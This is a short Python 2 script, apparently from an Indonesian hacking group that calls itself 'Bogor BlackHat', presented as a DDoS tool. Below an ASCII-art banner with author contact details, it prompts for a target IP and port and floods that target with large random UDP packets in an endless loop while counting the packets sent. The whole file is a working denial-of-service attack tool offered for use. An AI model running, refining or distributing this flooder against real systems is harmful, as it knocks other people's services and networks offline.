import sys
import os
import time
import socket
import random
import datetime


############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(30000)
############

os.system("clear")
time = time.ctime(time.time())
print
print """\033[31;1m
. ___________________
▕╮╭┻┻╮╭┻┻╮╭▕╮╲
▕╯┃╭╮┃┃╭╮┃╰▕╯╭▏
▕╭┻┻┻┛┗┻┻┛   ▕  ╰▏
▕╰━━━┓┈┈┈╭╮▕╭╮▏
▕╭╮╰┳┳┳┳╯╰╯▕╰╯▏
▕╰╯┈┗┛┗┛┈╭╮▕╮┈▏

 ⊂ヽ
　 ＼＼  Λ＿Λ
　　 ＼(  ˘ω˘  )
　　　 >　⌒ヽ
　　　/ 　 へ＼
　　 /　　/　＼＼
　　 ﾚ　ノ　　 ヽ_つ
　　/　/
　 /　/|
　(　(ヽ
　|　|、＼
　| 丿 ＼ ⌒)
　| |　　) /
  ノ )      Lﾉ
(_／

╔╗╔╗─╔═╗╔═╦═╗───╔╗─╔╗───╔═╗
╠╣║╚╗║═╣║║║║║╔╦╗║║─║║╔╗─║═╣
║║║╔╣╠═║║║║║║║╔╝║╚═╝║║╚╗║╔╝
╚╝╚═╝╚═╝╚╩═╩╝╚╝─╚══╗║╚═╝╚╝─
───────────────────║║──────
\033[32;1mCreated   : itsMr4lf
\033[32;1mWhatsapp  : 083815983767
\033[32;1mChannel   : Perkontolan
\033[32;1mGmail     : itsMr4lf@gmail.com
\033[31;1mType      : DDOS 
\033[31;1mTeam      : Bogor BlackHat
\033[31;1mTeam      : Terus Berjuang & Berkembang
----------------------------------------------
""" 
print
ip = raw_input("\033[32;1mIP Target : ")
port = input  ("\033[32;1mPort      : ")
os.system("clear")
sent = 0 
    
while True:
        
        sock.sendto(bytes, (ip, port)) 
        
        port = port + 0
        
        sent = sent + 1 
        
        print "\033[32;1mMenyerang \033[31;1m%s \033[32;1mdengan port \033[33;1m%s  \033[32;1mbytes \033[34;1m%s"%(ip, port, sent)


if __name__ == '__main__': 
        
        main()
    
     
    
    
